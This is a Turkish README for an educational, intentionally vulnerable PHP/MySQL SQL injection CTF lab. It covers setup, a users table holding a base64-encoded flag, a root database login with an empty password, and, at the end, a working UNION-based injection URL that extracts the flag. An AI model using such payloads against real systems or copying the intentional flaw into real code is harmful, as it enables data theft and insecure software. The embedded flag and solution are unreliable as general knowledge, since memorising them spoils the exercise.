# Orta Seviye SQL Injection CTF Laboratuvarı

Bu proje, SQL Injection açığı içeren orta seviye bir CTF (Capture The Flag) laboratuvarıdır. Eğitim amaçlı hazırlanmış ve kullanıcıların SQL Injection yöntemleriyle flag’i bulmasını hedeflemektedir.

---

## İçerikler

- `index.php`: Başlangıç sayfası, kullanıcıyı arama sayfasına yönlendirir.
- `search.php`: SQL Injection açığı içeren arama sayfası.
- `db.sql`: Veritabanı ve tablo oluşturma ile örnek kullanıcı kayıtlarını içeren SQL dosyası.

---

## Kurulum Adımları

### 1. Gerekli Yazılımların Kurulumu

- **Web sunucusu ve veritabanı için:** XAMPP, WAMP, MAMP veya LAMP kurulumu yapmalısınız.
- Bu paketler Apache, PHP ve MySQL/MariaDB içerir.

### 2. Veritabanı Oluşturma

- PhpMyAdmin veya MySQL komut satırını açın.

- Yeni bir veritabanı oluşturun:

```sql
CREATE DATABASE ctf_lab;
USE ctf_lab;
```

- db.sql dosyasındaki tablo ve veri oluşturma komutlarını çalıştırın. PhpMyAdmin’de "SQL" sekmesine gidip aşağıdaki komutları yapıştırın ve çalıştırın:

```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    info VARCHAR(255) NOT NULL
);

INSERT INTO users (username, info) VALUES
('admin', 'RkxBR3tzcWxfaW5qZWN0aW9uXzEyM30='),
('guest', 'TWVya2VkIHN0b3J5'),
('test', 'VGVzdCBrYXJ5YWN0ZXJp'),
('user', 'Tm9ybWFsIGluZm9ybWF0aW9u');
```
### 3. Web Dosyalarının Yerleştirilmesi
- index.php ve search.php dosyalarını, XAMPP gibi yazılımın htdocs dizini altına (örneğin C:\xampp\htdocs\ctf_lab\) kopyalayın.

- Dosyaların aynı klasörde olduğundan emin olun.

### 4. Veritabanı Bağlantısını Ayarlama
- search.php dosyasını açın.

- Aşağıdaki bölümü kendi ortamınıza göre düzenleyin (eğer XAMPP kullanıyorsanız genelde şunlar olur):
```php
$servername = "localhost";
$username = "root";
$password = ""; // XAMPP varsayılan şifre boş
$dbname = "ctf_lab";
```
### 5. Sunucuyu Başlatma
- XAMPP kontrol panelinden Apache ve MySQL servislerini başlatın.

- Her iki servis de çalışıyor olmalı.

### 6. Laboratuvara Erişim
- Tarayıcınızdan aşağıdaki URL’yi açın:

```http
http://localhost/ctf_lab/index.php
Ana sayfada bulunan “Arama Sayfasına Git” butonuna tıklayın.
```
- search.php sayfasına yönlendirileceksiniz.

### CTF Senaryosu ve Kullanımı
- search.php sayfasında kullanıcı adı (user) ve ID (id) alanlarını doldurup arama yapabilirsiniz.

- Sayfa bilinçli olarak SQL Injection açığı içerir.

- Flag, admin kullanıcısının info alanında base64 kodlu olarak saklanmıştır.

- Flag ancak user=admin ve id=1 koşulunda gösterilir.

### Örnek SQL Injection Payload
- Flag’i görmek için aşağıdaki URL’yi kullanabilirsiniz:
```http
http://localhost/ctf_lab/search.php?user=admin'%20UNION%20SELECT%20'admin',info%20FROM%20users%20WHERE%20username='admin'%20--%20-&id=1
```
### Not:
- Bu laboratuvar tamamen eğitim amaçlıdır.

- Üretim ortamlarında bu tür açıklardan kaçınılmalıdır.

